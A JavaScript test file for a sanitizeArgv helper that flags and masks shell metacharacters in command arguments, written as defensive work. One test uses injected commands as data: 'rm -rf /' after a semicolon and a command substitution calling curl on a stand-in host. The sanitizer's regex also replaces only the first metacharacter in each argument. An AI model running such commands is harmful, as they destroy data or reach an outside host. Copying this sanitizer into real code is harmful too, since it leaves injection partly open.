// Tests cho wrap_helpers.js sanitizeArgv function
const test = require('node:test');
const assert = require('node:assert');

// Re-implement sanitizeArgv để test logic (no import of wrap_helpers to avoid side effects)
// Backslash removed from metachars (Phase 1 fix - Windows path support)
const SHELL_METACHARS = /[|&;()<>$`"\'*?{}\n\r\t]/;

function sanitizeArgv(argv) {
  const sanitized = [];
  const warnings = [];
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    if (typeof arg !== 'string') {
      sanitized.push(String(arg));
      continue;
    }
    if (SHELL_METACHARS.test(arg)) {
      warnings.push(`argv[${i}] contains shell metachar: ${arg.substring(0, 50)}`);
      sanitized.push(arg.replace(SHELL_METACHARS, '_'));
    } else {
      sanitized.push(arg);
    }
  }
  return { sanitized, warnings };
}

test('sanitizeArgv — normal args pass through', () => {
  const { sanitized, warnings } = sanitizeArgv(['--live', '--force', 'docs/BRD.md']);
  assert.deepStrictEqual(sanitized, ['--live', '--force', 'docs/BRD.md']);
  assert.strictEqual(warnings.length, 0);
});

test('sanitizeArgv — shell metachars flagged + replaced', () => {
  const { warnings, sanitized } = sanitizeArgv(['title; rm -rf /', '$(curl evil.com)']);
  assert.strictEqual(warnings.length, 2);
  assert.ok(!sanitized[0].includes(';'));
  assert.ok(!sanitized[1].includes('$('));
});

test('sanitizeArgv — non-string coerced', () => {
  const { sanitized } = sanitizeArgv([123, null, true]);
  assert.strictEqual(sanitized[0], '123');
  assert.strictEqual(sanitized[1], 'null');
  assert.strictEqual(sanitized[2], 'true');
});

test('sanitizeArgv — Windows path allowed', () => {
  // wrap_helpers.py LOẠI backslash khỏi metachars (giống Phase 1 fix)
  // Tạo path sử dụng String.fromCharCode để tránh escape issue
  const winPath = ['C:', String.fromCharCode(92), 'Users', String.fromCharCode(92), 'foo'].join(String.fromCharCode(92)) + String.fromCharCode(92) + 'BRD.md';
  const { sanitized, warnings } = sanitizeArgv([winPath]);
  assert.strictEqual(warnings.length, 0, `got warnings: ${warnings}`);
  assert.strictEqual(sanitized[0], winPath);
});
